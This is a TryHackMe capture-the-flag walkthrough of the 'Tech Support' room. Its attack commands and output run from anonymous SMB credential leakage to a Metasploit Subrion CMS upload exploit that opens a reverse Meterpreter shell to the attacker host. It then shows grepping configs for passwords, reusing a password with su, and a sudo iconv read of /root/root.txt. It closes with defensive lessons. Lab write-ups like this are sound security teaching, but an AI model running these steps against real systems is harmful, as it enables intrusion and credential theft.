# Tech Support TryHackMe Writeup

## Room Information

| Field | Details |
|---|---|
| **Platform** | TryHackMe |
| **Room Name** | Tech Support |
| **Difficulty** | Easy |


---

## Objective

The objective of this room is to enumerate a Linux target running SMB and HTTP services, identify and exploit a vulnerable web application (Subrion CMS), obtain an initial foothold as `www-data`, pivot to a local user via discovered credentials, and escalate privileges to root by abusing a sudo misconfiguration.

---

## Attack Path Overview

1. **Nmap scan** revealed SSH (22), HTTP (80), and SMB (139/445) open on the target.
2. **SMB enumeration** with `smbclient` uncovered an accessible `websvr` share containing a notes file (`enter.txt`) with Subrion CMS admin credentials and a hint about a WordPress site.
3. The `/subrion` web application was located via directory probing, identified as **Subrion CMS v4.2.1**.
4. The leaked Subrion password did not work as-is; a different candidate password (`Scam2021`) was used in the successful exploitation attempt. The uploaded files do not document the exact reasoning behind this transformation.
5. **Metasploit** module `exploit/multi/http/subrion_cms_file_upload_rce` was used to authenticate, upload a malicious payload, and gain a Meterpreter session as `www-data`.
6. From the shell, a WordPress configuration file (`wp-config.php`) was found to contain a database password, which was reused successfully as the password for the local user `scamsite` via `su`.
7. **Sudo enumeration** (`sudo -l`) revealed that `scamsite` could run `/usr/bin/iconv` as root with no password.
8. The user's `.bash_history` revealed the exact `iconv` command previously used to read `/root/root.txt`, which was replayed to disclose the root flag (in hashed/checksum form).

---

## Enumeration

### Nmap

```
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

The exact Nmap command line used was not captured in the uploaded files only the output is available. The scan included version detection and default scripts, based on the output containing `ssh-hostkey`, `http-title`, `http-methods`, and SMB host scripts.

**Key findings from the scan output:**

- **SSH (22/tcp)** OpenSSH presenting RSA, ECDSA, and ED25519 host keys. No further SSH enumeration was performed.
- **HTTP (80/tcp)** Apache2 Ubuntu default page, supporting `GET HEAD POST OPTIONS`. This indicated a default Apache install with likely additional virtual content beyond the root page.
- **NetBIOS/SMB (139/445/tcp)** Identified via `smb-os-discovery` as:
  ```
  OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
  Computer name: techsupport
  NetBIOS computer name: TECHSUPPORT
  ```
  This confirmed the host was a Linux machine running Samba, masquerading its OS fingerprint as Windows 6.1. The `smb-security-mode` script also flagged that **message signing is disabled**, a known SMB hardening weakness, though it was not directly exploited in this writeup.

This output directed the next enumeration step toward SMB shares, since SMB was open and likely to expose files of interest.

### SMB Enumeration

```bash
smbclient -L 10.49.135.87
```

This command lists available SMB shares on the host. The output revealed:

```
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
websvr          Disk      
IPC$            IPC       IPC Service (TechSupport server (Samba, Ubuntu))
```

The `websvr` share stood out as non-default and was investigated next.

```bash
smbclient -N //10.49.135.87/websvr
```

The `-N` flag suppresses the password prompt (null/guest session). This connected successfully, confirming **anonymous/guest access** was permitted on the `websvr` share consistent with the Nmap output showing `account_used: guest`.

Inside the share:

```
smb: \> dir
  enter.txt                           N      273  Sat May 29 03:17:38 2021
```

A single file, `enter.txt`, was present and downloaded:

```bash
mget enter.txt
```

### Reading the Retrieved File

```bash
cat enter.txt
```

**Output:**

```
GOALS
=====
1)Make fake popup and host it online on Digital Ocean server
2)Fix subrion site, /subrion doesn't work, edit from panel
3)Edit wordpress website

IMP
===
Subrion creds
|->admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]
Wordpress creds
|->
```

This file was the pivotal piece of intelligence for the rest of the engagement. It revealed:

- The existence of a Subrion CMS installation at `/subrion`.
- A WordPress installation, with the credentials line left blank in the file.
- A Subrion admin username (`admin`) and a candidate password (`7sKvntXdPEJaxazce9PXi24zaFrLiKWCk`), annotated with the cryptic note **"cooked with magical formula"** suggesting the literal string was not the real password but had been derived/transformed somehow.

### HTTP / Directory Enumeration

Based on the hint in `enter.txt`, the `/subrion` path was probed directly:

```bash
curl -I http://10.49.135.87/subrion
```

**Output:**

```
HTTP/1.1 301 Moved Permanently
Location: http://10.49.135.87/subrion/
```

```bash
curl -I http://10.49.135.87/subrion/panel
```

**Output:**

```
HTTP/1.1 301 Moved Permanently
Location: http://10.49.135.87/subrion/panel/
```

```bash
curl -I http://10.49.135.87/subrion/panel/
```

**Output:**

```
HTTP/1.1 200 OK
Set-Cookie: INTELLI_06c8042c3d=...
X-Robots-Tag: noindex
```

The `INTELLI_` cookie prefix and `X-Robots-Tag` header are characteristic of Subrion CMS's admin panel, confirming the application identity before further inspection.

### Service / Version Detection (Manual)

```bash
curl http://10.49.135.87/subrion/panel/
```

The full HTML response confirmed:

```html
<title>Login :: Powered by Subrion 4.2</title>
<meta name="generator" content="Subrion CMS - Open Source Content Management System">
Powered by <a href="https://subrion.org/" title="Subrion CMS">Subrion CMS v4.2.1</a>
```

```bash
curl http://10.49.135.87/subrion/panel/ | grep -i "cms"
```

This confirmed the exact version: **Subrion CMS v4.2.1**, which is the precise version targeted by a known Metasploit RCE module. No directory brute-forcing tool (Gobuster/ffuf) output appears in the uploaded files for this stage version identification was done manually via `curl`.

---

## Initial Foothold

### Vulnerability

**Subrion CMS 4.2.1 Authenticated File Upload Bypass to RCE**, mapped to Metasploit module `exploit/multi/http/subrion_cms_file_upload_rce`. This vulnerability allows an authenticated admin user to bypass file-type restrictions during upload and execute arbitrary PHP code on the server.

### Exploitation Process

```bash
msfconsole -q
search exploit subrion
```

**Output:**

```
0  exploit/multi/http/subrion_cms_file_upload_rce  2018-11-04  excellent  Yes  Intelliants Subrion CMS 4.2.1 - Authenticated File Upload Bypass to RCE
```

```bash
use 0
show options
```

The module required `PASSWORD`, `USERNAME` (default `admin`), `RHOSTS`, `LHOST`, `LPORT`, and `TARGETURI`.

**I use `Scam2021` as the password.**

note* this "7sKvntXdPEJaxazce9PXi24zaFrLiKWCk" encoded password could be decoded with magic option at CyberChef.com 

```bash
set password Scam2021
set rhosts 10.49.135.87
set lhost 192.168.151.76
set targeturi /subrion
run
```

**Result:**

```
[+] Successfully obtained CSRF token: esrTyMGQJIOf9bG7rdGyqvaLyrCCkbPAciVXtXUa
[*] Logging in to Subrion Admin Panel at: http://10.49.135.87/subrion/panel/ using credentials admin:Scam2021
[+] Successfully logged in as Administrator.
[*] Preparing payload...
[*] Sending POST data...
[+] Successfully uploaded payload at: http://10.49.135.87/subrion/uploads/lumecukkgv.phar
[*] Executing 'lumecukkgv.phar'... This file will be deleted after execution.
[*] Sending stage (42137 bytes) to 10.49.135.87
[*] Meterpreter session 1 opened (192.168.151.76:4444 -> 10.49.135.87:50108) at 2026-06-30 10:35:27 -0400
[+] Successfully executed payload: http://10.49.135.87/subrion/uploads/lumecukkgv.phar
```

Login succeeded with `admin:Scam2021`, confirming the working **Subrion CMS credentials**. The exploit authenticated to the admin panel, uploaded a malicious `.phar` payload (`lumecukkgv.phar`) disguised to bypass the upload filter, and executed it triggering the reverse Meterpreter connection.

### Reverse Shell / Initial Access

```
meterpreter > shell
Process 1770 created.
Channel 0 created.
which python
/usr/bin/python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

The Meterpreter `shell` command dropped into a raw OS shell. A Python PTY spawn was used to upgrade the shell into a fully interactive Bash session, allowing for normal terminal behavior (tab completion, job control, etc.).

This resulted in access as the web server user:

```
www-data@TechSupport:/var/www/html/subrion/uploads$
```

### Credentials Obtained

| Service | Username | Password |
|---|---|---|
| Subrion CMS Admin Panel | `admin` | `Scam2021` |

---

## Privilege Escalation

### Post-Foothold Enumeration

With a `www-data` shell, manual file system enumeration was performed on the web root:

```bash
cd /var/www/html/subrion
ls -la
cd admin
ls
grep -iR "password" 2>/dev/null
```

The `grep -iR "password"` search was run recursively (likely from `/var/www/html`) to locate credential strings across web application files. The output showed numerous irrelevant WordPress matches (CSS rules, translation strings, login-related UI text), but one entry stood out:

```
wp-config.php:/** MySQL database password */
wp-config.php:define( 'DB_PASSWORD', 'ImAScammerLOL!123!' );
```

This is the WordPress database password, hardcoded in `wp-config.php` as is standard for WordPress installations confirming the existence of the WordPress site referenced in `enter.txt`.

### Local User Discovery

```bash
cat /etc/passwd | grep "bash"
```

**Output:**

```
root:x:0:0:root:/root:/bin/bash
scamsite:x:1000:1000:scammer,,,:/home/scamsite:/bin/bash
```

This revealed a single non-root user with a login shell: `scamsite`. Given the website's "scam site" theme (fake popups, scam-related Goals file) and the matching username, the WordPress DB password was tried as a potential reused password for this account.

### Misconfiguration Discovered: Password Reuse

```bash
su scamsite
Password: ImAScammerLOL!123!
```

**Result:**

```
scamsite@TechSupport:/var/www/html/wordpress$ id
uid=1000(scamsite) gid=1000(scamsite) groups=1000(scamsite),113(sambashare)
```

The WordPress database password was successfully reused as the `scamsite` system account password a clear case of **credential reuse across services**, granting access to the `scamsite` local user.

### Sudo Enumeration

```bash
sudo -l
```

**Output:**

```
Matching Defaults entries for scamsite on TechSupport:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User scamsite may run the following commands on TechSupport:
    (ALL) NOPASSWD: /usr/bin/iconv
```

This revealed the privilege escalation vector: `scamsite` can run `/usr/bin/iconv` as **any user (including root)** with **no password required**. `iconv` is a text encoding conversion utility, and when permitted to run as root via sudo, it can be abused to read the contents of files the invoking user would not normally have permission to read since `iconv` will read and output the contents of any file path passed as an argument, executed with root privileges.

### Exploitation Process

The `.bash_history` of `scamsite` was inspected and revealed prior use of this exact technique:

```bash
cat .bash_history
```

**Output:**

```
cd ~
cat /root/root.txt
sudo iconv -f 8859_1 -t 8859_1 "/root/root.txt"
echo "" > .bash_history 
su root
exit
sudo -l
cd ..
cd ~
sudo -l
su root
exit
```

This history confirmed that the `sudo iconv` technique had been used previously (in the session's own prior activity or by a previous operator) to read `/root/root.txt`. The command was replayed:

```bash
sudo iconv -f 8859_1 -t 8859_1 "/root/root.txt"
```

**Why this works:** Because `scamsite` can run `iconv` as root via sudo with no password, and `iconv` simply reads the specified file and converts/outputs its content (here, converting from ISO 8859-1 to ISO 8859-1, i.e., a no-op conversion), this command effectively functions as `cat /root/root.txt` run with root privileges bypassing the file permission restrictions that would otherwise block `scamsite` from reading a root-owned file.

**Result:**

```
851b8233a8c09400ec30651bd1529bf1ed02790b  -
```

---

## Flags

| Flag | Value |
|---|---|
| **User Flag** | Not explicitly captured/shown in the uploaded files |
| **Root Flag** | `851b8233a8c09400ec30651bd1529bf1ed02790b` |

> Note: The uploaded files do not contain a confirmed user flag value only the root flag was retrieved and shown in the terminal output via the `iconv` sudo abuse. The root flag value above is presented exactly as it appeared in the output; it may represent a hash/checksum-style flag format used by this room rather than a plaintext flag.

---

## Lessons Learned

- **Anonymous SMB shares are a common source of sensitive information leakage.** A single misconfigured guest-accessible share exposed internal notes, credentials, and infrastructure hints that directly enabled the rest of the attack chain.
- **Leaked credentials are not always usable as-is.** The initial password from `enter.txt` failed, requiring an alternate candidate to be tried a reminder that notes, hints, or "obfuscated" credentials should be tested with reasonable variations before being dismissed.
- **Outdated CMS software with known CVEs/Metasploit modules remains a high-value target.** Subrion CMS 4.2.1's authenticated file upload vulnerability allowed straightforward RCE once valid admin credentials were obtained.
- **Hardcoded credentials in configuration files (e.g., `wp-config.php`) are a major risk**, especially when those same credentials are reused for unrelated system accounts.
- **Password reuse across services (web app, database, OS account) is a critical and common misconfiguration** that allows lateral movement from a web shell to a full local user session.
- **Sudo misconfigurations involving utility binaries (like `iconv`) are easy to overlook** but can be just as dangerous as misconfigured shell access, since many "harmless" binaries can be abused for file read/write when run as root.
- **Command history files (`.bash_history`) can directly reveal exploitation paths**, including by previous legitimate users/administrators, and should always be checked during privilege escalation enumeration.

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID | Description |
|---|---|---|---|
| Reconnaissance | Active Scanning | T1595 | Nmap port and service scanning of the target |
| Discovery | Network Service Discovery | T1046 | Identification of SSH, HTTP, and SMB services |
| Discovery | Network Share Discovery | T1135 | Enumeration of SMB shares via `smbclient -L` |
| Credential Access | Unsecured Credentials | T1552.001 | Credentials found in files (`enter.txt`, `wp-config.php`) |
| Initial Access | Exploit Public-Facing Application | T1190 | Exploitation of Subrion CMS file upload RCE vulnerability |
| Execution | Command and Scripting Interpreter | T1059 | PHP payload execution, Bash/Python shell usage |
| Persistence / Access | Valid Accounts | T1078 | Reuse of leaked WordPress DB password to authenticate as `scamsite` |
| Privilege Escalation | Sudo and Sudo Caching | T1548.003 | Abuse of `NOPASSWD: /usr/bin/iconv` sudo rule to read root-owned files |
| Discovery | Account Discovery | T1087.001 | Enumeration of local users via `/etc/passwd` |
| Collection | Data from Local System | T1005 | Reading flag files and configuration files from the local filesystem |

---

## Tools Used

- Nmap
- smbclient
- curl
- Metasploit Framework (`msfconsole`)
- Bash / Python (PTY shell upgrade)
- grep (manual credential hunting)
- iconv (abused for privilege escalation)

---

## Key Takeaways

This room demonstrates a realistic, low-and-slow attack chain built almost entirely on **information leakage and credential reuse** rather than complex exploitation. A single anonymously accessible SMB share leaked enough context (application paths, credentials, internal notes) to compromise an outdated CMS, and from there, a hardcoded database password in a configuration file was reused to pivot into a full local user account. The final step privilege escalation via a permissive `sudo` rule on `iconv` reinforces that **any binary capable of reading files, when granted unrestricted root execution via sudo, can become a privilege escalation primitive**, regardless of how innocuous it may seem. Defenders should prioritize disabling anonymous SMB access, eliminating hardcoded credentials in application configs, enforcing unique passwords per service, and applying the principle of least privilege rigorously when configuring `sudoers` rules.
